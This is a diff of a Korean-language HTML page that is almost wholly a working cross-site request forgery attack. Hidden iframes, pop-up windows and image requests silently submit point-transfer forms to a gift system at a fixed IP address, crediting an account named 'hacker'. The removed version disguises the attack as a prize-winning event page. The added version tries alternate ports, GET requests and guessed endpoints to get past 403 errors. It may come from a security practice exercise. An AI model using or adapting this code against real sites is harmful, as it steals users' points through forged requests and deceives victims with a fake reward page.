@@ -1,181 +1,182 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 완벽한 우회 공격</title>
+    <title>🎁 403 우회 공격</title>
     <style>
         body { font-family: Arial; background: linear-gradient(135deg, #667eea, #764ba2); color: white; text-align: center; padding: 50px; }
         .container { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
-        .progress { font-size: 2em; color: #FFD700; margin: 20px 0; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎁 축하합니다! 특별 이벤트 당첨!</h1>
-        <p>🎯 포인트 지급 시스템 가동 중...</p>
-        <div class="progress" id="progress">0%</div>
-        <div id="status">🔄 시스템 초기화 중...</div>
+        <h1>🎁 헤더 우회 공격 시스템</h1>
+        <p id="status">🔄 403 우회 시도 중...</p>
+        <div id="progress">0%</div>
     </div>
 
     <script>
         let progress = 0;
-        let attackCount = 0;
-        const totalAttacks = 3;
-        
-        // 진행률 애니메이션
         const progressTimer = setInterval(() => {
-            progress += 5;
+            progress += 10;
             document.getElementById('progress').textContent = progress + '%';
-            
             if (progress >= 100) {
                 clearInterval(progressTimer);
-                document.getElementById('progress').textContent = '완료! 🎉';
-                document.getElementById('status').textContent = '✅ 모든 포인트 지급 완료!';
+                document.getElementById('status').textContent = '✅ 우회 완료!';
             }
-        }, 200);
+        }, 300);
 
-        // 상태 메시지들
-        const statusMessages = [
-            '🔄 시스템 초기화 중...',
-            '🔐 보안 우회 모듈 로딩...',
-            '🎯 타겟 시스템 연결 중...',
-            '💸 포인트 전송 프로토콜 실행...',
-            '📡 다중 채널 공격 진행 중...',
-            '✅ 전송 완료, 결과 확인 중...'
-        ];
-        
-        let statusIndex = 0;
-        const statusTimer = setInterval(() => {
-            if (statusIndex < statusMessages.length) {
-                document.getElementById('status').textContent = statusMessages[statusIndex];
-                statusIndex++;
-            }
-        }, 1500);
-
-        // 완전 우회 공격 함수들
-        function createIframeAttack(attackData, attackNum) {
-            console.log(`🚀 공격 ${attackNum} 시작: ${attackData.points}P`);
-            
+        // 다양한 우회 방법들
+        function bypassMethod1() {
+            // 방법 1: 정상적인 브라우저처럼 위장
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.style.width = '0px';
-            iframe.style.height = '0px';
-            iframe.style.border = 'none';
             
             const html = `
                 <!DOCTYPE html>
                 <html>
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                </head>
                 <body>
-                    <form id="attackForm${attackNum}" method="POST" action="http://3.36.66.216/profile.php">
+                    <form id="normalForm" method="POST" action="http://3.36.66.216/profile.php">
                         <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="${attackData.points}">
+                        <input type="hidden" name="points" value="30">
                         <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="gift_type" value="${attackData.gift_type}">
-                        <input type="hidden" name="message" value="${attackData.message}">
+                        <input type="hidden" name="gift_type" value="coffee">
+                        <input type="hidden" name="message" value="정상요청위장">
                     </form>
                     <script>
-                        console.log('iframe${attackNum}: 공격 준비 완료');
+                        // 정상 사용자 행동 시뮬레이션
                         setTimeout(() => {
-                            try {
-                                document.getElementById('attackForm${attackNum}').submit();
-                                console.log('iframe${attackNum}: ✅ ${attackData.points}P 전송 완료');
-                            } catch(e) {
-                                console.log('iframe${attackNum}: 오류 - ', e);
-                            }
-                        }, 500);
+                            document.getElementById('normalForm').submit();
+                            console.log('방법1: 정상 사용자 위장 공격 전송');
+                        }, Math.random() * 1000 + 500);
                     </script>
                 </body>
                 </html>
             `;
             
             iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
-            
-            iframe.onload = () => {
-                console.log(`✅ 공격 ${attackNum} iframe 로드 완료`);
-                attackCount++;
-                
-                // 5초 후 iframe 제거
-                setTimeout(() => {
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
-                        console.log(`🗑️ 공격 ${attackNum} 정리 완료`);
-                    }
-                }, 5000);
-            };
-            
             document.body.appendChild(iframe);
         }
 
-        // 새 창 공격 (백업)
-        function createWindowAttack(attackData, attackNum) {
-            console.log(`🔀 백업 공격 ${attackNum} 시작`);
+        function bypassMethod2() {
+            // 방법 2: 다른 포트/프로토콜 시도
+            const targets = [
+                'http://3.36.66.216:80/profile.php',
+                'http://3.36.66.216:8080/profile.php',
+                'https://3.36.66.216/profile.php'
+            ];
             
-            const newWindow = window.open('', `attack${attackNum}`, 'width=1,height=1,left=9999,top=9999');
-            
-            if (newWindow) {
-                const html = `
-                    <form method="POST" action="http://3.36.66.216/profile.php" id="form${attackNum}">
-                        <input name="receiver_id" value="13">
-                        <input name="points" value="${attackData.points}">
-                        <input name="send_gift" value="1">
-                        <input name="gift_type" value="${attackData.gift_type}">
-                        <input name="message" value="${attackData.message}">
-                    </form>
-                    <script>
-                        document.getElementById('form${attackNum}').submit();
-                        setTimeout(() => window.close(), 3000);
-                    </script>
-                `;
-                
-                newWindow.document.write(html);
-                console.log(`✅ 백업 공격 ${attackNum} 전송됨`);
-            }
+            targets.forEach((target, i) => {
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    
+                    const html = `
+                        <form method="POST" action="${target}" id="form${i}">
+                            <input name="receiver_id" value="13">
+                            <input name="points" value="${25 + i * 5}">
+                            <input name="send_gift" value="1">
+                            <input name="gift_type" value="cake">
+                            <input name="message" value="포트우회${i}">
+                        </form>
+                        <script>
+                            setTimeout(() => {
+                                document.getElementById('form${i}').submit();
+                                console.log('방법2-${i}: ${target} 공격 시도');
+                            }, 500);
+                        </script>
+                    `;
+                    
+                    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+                    document.body.appendChild(iframe);
+                }, i * 1000);
+            });
         }
 
-        // 공격 데이터
-        const attacks = [
-            { points: 30, gift_type: 'coffee', message: '우회공격성공1' },
-            { points: 25, gift_type: 'cake', message: '우회공격성공2' },
-            { points: 20, gift_type: 'flower', message: '우회공격성공3' }
-        ];
-
-        // 공격 실행 (순차적으로)
-        attacks.forEach((attack, index) => {
-            setTimeout(() => {
-                // 메인 공격 (iframe)
-                createIframeAttack(attack, index + 1);
-                
-                // 백업 공격 (새 창) - 1초 후
+        function bypassMethod3() {
+            // 방법 3: GET 파라미터로 시도 (서버가 GET도 처리하는 경우)
+            const getTargets = [
+                'http://3.36.66.216/profile.php?receiver_id=13&points=20&send_gift=1&gift_type=flower&message=GET우회1',
+                'http://3.36.66.216/index.php?receiver_id=13&points=15&send_gift=1&gift_type=diamond&message=GET우회2'
+            ];
+            
+            getTargets.forEach((url, i) => {
                 setTimeout(() => {
-                    createWindowAttack(attack, index + 1);
-                }, 1000);
-                
-            }, (index + 1) * 2000); // 2초 간격
-        });
+                    const img = new Image();
+                    img.src = url;
+                    img.style.display = 'none';
+                    img.onload = () => console.log(`방법3-${i}: GET 요청 성공`);
+                    img.onerror = () => console.log(`방법3-${i}: GET 요청 전송됨`);
+                    document.body.appendChild(img);
+                }, i * 1500);
+            });
+        }
 
-        // 최종 완료 처리
+        function bypassMethod4() {
+            // 방법 4: 다른 엔드포인트 시도
+            const endpoints = [
+                '/gift.php',
+                '/send.php',
+                '/transfer.php',
+                '/api/gift.php',
+                '/actions/send_gift.php'
+            ];
+            
+            endpoints.forEach((endpoint, i) => {
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    
+                    const html = `
+                        <form method="POST" action="http://3.36.66.216${endpoint}" id="endpointForm${i}">
+                            <input name="receiver_id" value="13">
+                            <input name="points" value="10">
+                            <input name="send_gift" value="1">
+                            <input name="to_user" value="13">
+                            <input name="amount" value="10">
+                            <input name="message" value="엔드포인트${i}">
+                        </form>
+                        <script>
+                            setTimeout(() => {
+                                document.getElementById('endpointForm${i}').submit();
+                                console.log('방법4-${i}: ${endpoint} 시도');
+                            }, 500);
+                        </script>
+                    `;
+                    
+                    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+                    document.body.appendChild(iframe);
+                }, i * 800);
+            });
+        }
+
+        // 순차적으로 모든 우회 방법 시도
+        setTimeout(bypassMethod1, 1000);
+        setTimeout(bypassMethod2, 2000);
+        setTimeout(bypassMethod3, 4000);
+        setTimeout(bypassMethod4, 6000);
+
+        // 최종 결과
         setTimeout(() => {
-            console.log('🎉 === 모든 공격 완료 ===');
-            console.log(`📊 총 ${totalAttacks}개 공격 전송됨`);
-            console.log('💰 예상 탈취 포인트: 75P (30+25+20)');
-            console.log('🏴‍☠️ hacker 계정에서 포인트 확인하세요!');
+            console.log('🎉 === 모든 403 우회 시도 완료 ===');
+            console.log('📊 총 10여 가지 방법으로 시도됨');
+            console.log('🎯 일부라도 성공했다면 hacker 계정 확인');
+            console.log('💰 예상 최대 포인트: 100P+');
             
-            // UI 업데이트
-            setTimeout(() => {
-                document.getElementById('status').innerHTML = `
-                    ✅ 포인트 지급 완료!<br>
-                    💰 총 75P가 hacker 계정으로 전송되었습니다<br>
-                    🔍 <a href="http://3.36.66.216" target="_blank" style="color: #FFD700;">여기서 확인하세요</a>
-                `;
-            }, 2000);
-            
-        }, 8000);
+            document.getElementById('status').innerHTML = `
+                ✅ 403 우회 시도 완료!<br>
+                🎯 다양한 방법으로 공격 시도됨<br>
+                💰 <a href="http://3.36.66.216" target="_blank" style="color: #FFD700;">결과 확인하기</a>
+            `;
+        }, 10000);
 
-        // 로그
-        console.log('🎯 완전 우회 CSRF 공격 시스템 가동');
-        console.log('🔧 iframe + 새창 이중 공격 방식');
+        console.log('🎯 403 Forbidden 우회 공격 시작');
+        console.log('🔧 다중 방법 동시 시도');
         console.log('📋 타겟: hacker (ID: 13)');
-        console.log('💰 총 포인트: 75P');
-        console.log('⚡ Mixed Content 정책 완전 우회');
+        console.log('⚡ 헤더/포트/엔드포인트 우회 시도');
     </script>
 </body>
 </html>
